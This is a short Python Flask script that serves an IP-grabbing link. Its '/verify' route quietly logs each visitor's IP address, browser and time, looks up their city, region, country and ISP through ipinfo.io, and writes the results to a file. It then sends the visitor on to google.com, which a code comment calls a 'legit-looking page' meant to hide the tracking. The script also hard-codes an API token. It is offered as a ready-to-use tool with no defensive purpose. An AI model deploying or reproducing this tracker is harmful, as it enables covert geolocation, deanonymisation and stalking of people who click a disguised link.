from flask import Flask, request, redirect
import requests
from datetime import datetime

app = Flask(__name__)

IPINFO_TOKEN = "faff49844191d5"  # free token

@app.route("/verify")
def track():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent")
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    geo = requests.get(f"https://ipinfo.io/{ip}?token={IPINFO_TOKEN}").json()

    log = f"""
    TIME: {time}
    IP: {ip}
    CITY: {geo.get('city')}
    REGION: {geo.get('region')}
    COUNTRY: {geo.get('country')}
    ISP: {geo.get('org')}
    DEVICE: {user_agent}
    ------------------------
    """

    with open("logs.txt", "a") as f:
        f.write(log)

    # Redirect to legit-looking page
    return redirect("https://www.google.com")

if __name__ == "__main__":
    app.run()
